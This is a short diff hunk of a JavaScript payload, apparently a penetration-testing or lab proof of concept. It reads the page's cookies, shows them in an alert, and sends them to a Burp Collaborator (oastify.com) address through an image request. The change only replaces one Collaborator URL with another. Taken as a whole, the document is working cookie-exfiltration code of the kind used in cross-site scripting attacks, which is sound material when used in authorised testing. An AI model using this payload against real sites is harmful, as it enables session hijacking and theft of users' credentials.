@@ -8,6 +8,6 @@ var cookies = document.cookie;
 alert("Cookies: " + cookies);
 
 // Send the cookies to your Burp Collaborator URL
-var burpCollaboratorURL = "https://mh7587gmzgcs1acch9zst61o7fd618px.oastify.com"; // Replace with your actual Burp Collaborator URL
+var burpCollaboratorURL = "https://2adm43ns1u8ujq1q9nipcc8lhcn3b0zp.oastify.com"; // Replace with your actual Burp Collaborator URL
 var img = new Image();
 img.src = burpCollaboratorURL + "/?cookie=" + encodeURIComponent(cookies);
